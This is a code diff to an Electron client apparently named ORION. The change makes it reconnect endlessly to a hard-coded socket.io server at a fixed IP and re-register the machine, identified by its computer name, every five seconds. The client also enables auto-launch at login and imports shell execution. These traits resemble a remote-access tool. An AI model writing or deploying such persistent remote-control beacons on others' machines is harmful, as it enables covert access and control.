@@ -27,7 +27,7 @@ let Socket = io.connect( 'http://198.211.125.38:3000/', {
   'reconnection': true,
   'reconnectionDelay': 5,
   'reconnectionDelayMax' : 10,
-  'reconnectionAttempts': 10 ** 10
+  'reconnectionAttempts': Infinity
 })
 let exec = require('child_process').exec;
 const Store = require('electron-store');
@@ -45,17 +45,24 @@ const autoLaunchPowers = new autoLaunch({
 });
 autoLaunchPowers.enable();
 
-if (!store.get('uniqueRoomNumber')){
-  store.set(
-    'uniqueRoomNumber',
-    Math.floor(Math.random()*16777215).toString(16).toUpperCase().substr(1, 3) + "-" + computerName
+let connect = () => {
+  if (!store.get('uniqueRoomNumber')){
+    store.set(
+      'uniqueRoomNumber',
+      Math.floor(Math.random()*16777215).toString(16).toUpperCase().substr(1, 3) + "-" + computerName
+    )
+  }
+
+  console.log("[ORION]: Emitting as PC: ", store.get('uniqueRoomNumber').toString())
+  Socket.emit('roomConnectionHost',
+    store.get('uniqueRoomNumber').toString()
   )
 }
 
-console.log("[ORION]: Emitting as PC: ", store.get('uniqueRoomNumber').toString())
-Socket.emit('roomConnectionHost',
-  store.get('uniqueRoomNumber').toString()
-)
+connect()
+setInterval(function(){
+  connect()
+}, 5000)
 
 let additionalFunctions = {
   ChangeBackground: (DATA) => {
